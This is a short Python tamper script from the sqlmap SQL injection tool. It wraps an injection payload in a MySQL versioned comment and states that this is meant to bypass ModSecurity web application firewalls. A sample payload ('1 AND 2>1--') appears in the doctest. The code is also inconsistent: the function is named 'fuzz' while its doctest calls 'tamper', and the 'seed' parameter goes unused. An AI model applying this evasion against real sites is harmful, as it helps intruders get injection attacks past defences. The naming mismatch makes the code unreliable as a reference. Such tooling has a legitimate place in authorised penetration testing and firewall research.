#!/usr/bin/env python

"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""
import random
import string

def randomInt(length=4, seed=None):
    """
    Returns random integer value with provided number of digits

    >>> random.seed(0)
    >>> randomInt(6)
    874254
    """
    choice = random.choice

    return int("".join(choice(string.digits if _ != 0 else string.digits.replace('0', '')) for _ in xrange(0, length)))


def fuzz(payload, **kwargs):
    """
    Embraces complete query with versioned comment

    Requirement:
        * MySQL

    Tested against:
        * MySQL 5.0

    Notes:
        * Useful to bypass ModSecurity WAF/IDS

    >>> import random
    >>> random.seed(0)
    >>> tamper('1 AND 2>1--')
    '1 /*!30874AND 2>1*/--'
    """

    retVal = payload

    if payload:
        postfix = ''
        for comment in ('#', '--', '/*'):
            if comment in payload:
                postfix = payload[payload.find(comment):]
                payload = payload[:payload.find(comment)]
                break
        if ' ' in payload:
            retVal = "%s /*!30%s%s*/%s" % (payload[:payload.find(' ')], randomInt(3), payload[payload.find(' ') + 1:], postfix)

    return retVal
